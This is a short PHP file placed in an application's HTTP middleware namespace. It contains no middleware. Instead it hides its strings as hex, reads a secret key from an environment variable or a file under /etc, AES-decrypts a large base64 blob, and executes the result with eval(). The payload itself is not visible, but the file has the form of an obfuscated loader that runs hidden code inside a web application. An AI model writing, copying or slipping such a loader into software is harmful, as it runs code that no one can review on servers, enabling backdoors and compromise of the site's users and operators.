<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('NsPo8pFppX//sFq/Wtkq2A==');

$c=base64_decode(

'mgY7o8dDzMBChKExMouZ0CjoBpmWm/3srhkhBkWrpCqt1LJ21MSzqzkGix/Vq5NH6rBqwcf6gsS0' .
'R85Uh0NpOqdrBRmOzm4LGNoy8r2FBw+7L7m/MTe9Nf2DkUFrJ16RF0rOmSxO1G7REJT8RVgIxkv9' .
'hsGQOcSnvdWLP2OaalBwgjTchic4RfqPuPjX44Wn68/JPmH9Z+8sZDyBk+UgqGg7uaGGBH6hUSnD' .
'53uzHovfBTACDBbeSuerd+0PGPlw+KyfCKpHMq8hwGySrWwO9FVF4snP725wv9GZ0e3251xE2lVn' .
'hruvdhf7sq3pS+LD80subkVGCW73uPVrbAy3LoQd4pENe74Z3dH5EckAv82NJHLn0tsFgvVqrKwr' .
'rcWnc7xqLAWJ2ggUSjZinHCYR9yOKkQ3T1bvf27oobIdHeZMT/Md7nWLdyLJCN8CN7670EYtFgdz' .
'RuTldzwyPmEE/MuKxDQJQxM+1+sXkPHH1KgZz+djHA0ZPu65BRd09PT3bopEqDZSPDWfpJo6RI0U' .
'w+4Uj7C/oHGXTTEw5CCeXyNW6nWx954LE263qvLlTR/VcaIcY/GD9S93d/Par+jsmMSrFLDuozIp' .
'j1y6t+7CQpMljr9CzbN1/6peWX1Ai6psssg5BnP1IwsPrYoOB8BxQGBNA0EHp6J2EaDgyKQzteJe' .
'VBCpyNswmlMIggBhCHU3htlIihk9C4QMyx6OSi8ovzT2FWy7zU7ti7Ai/mh1g/qDWyWejNhhVBmD' .
'rPrmQHoEe2XwnfTC0hJhUHF5PeCcTwsKxajvdVAtFhjW6d1FUtLXHEhBUywvWN7YwjmskSZonTnY' .
'F6mr3aoOBz2ikl+MWwyJ+rUyU3PTXNAWwdPjHXj3oS1DGcjXTjMxX0YsGO0t0fHDKAUVtZEQYsae' .
'wCQQOtHa/zs3vLoHVkT6cfH6jsryeATWQuzWFJx9Vy6cJj773ZgN8XZXwGAJAH8XSICsalHERpCL' .
'Vu04jSlk42YNFNmNZSuJ/UFrH8FSkRiQKW0eUQrcUJnae+61xkfmvu3W8s2TEtv2mKPxy7EvryRm' .
'xjAZCaI83uoz7bcdhMvjFLesiefpXrE2tSDSSV2BkzxhPWJaNqqaR0qH2tIKew/kIWaFo92m5n8F' .
'apoyDorvr6CaG5zPg6sKwAr38g9//mrRXB51y9u8j9UrlPOpWjspxA41dH1Kc5i9uRX+f+WKxiNQ' .
'XBzqYEyllGGwWWDyRA7EE7njcXNnTx9ReXz44FC8ojAd1U4ujaINt9zrVeZwat5Rpe+9PFcFIKtR' .
'4vSA+hxyJAF/xNt2l9xwQj4BtpfXjGNYcyNbJLb6lxO/v3s8hMl3yUH5tdvzRvi7Mrnh2C9bmhqa' .
'h6W8SdU+RaCw8XQX6kdTjhRM4x5tfDW257pS7ehU4RbDVPVYbQD/G1Q0zA6+Ug9hMUHYjh1fkafY' .
'22KHCJSJUPCU6xu8qC1Uqa11pP5s8OlEQjMwX+SCd8vwAqPjsE+aF7BtL04/OS21IpJLAZPkhd+0' .
'kNpslL0q4NkQKJcsYPs+IotsFoLyenNNxt/MHQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

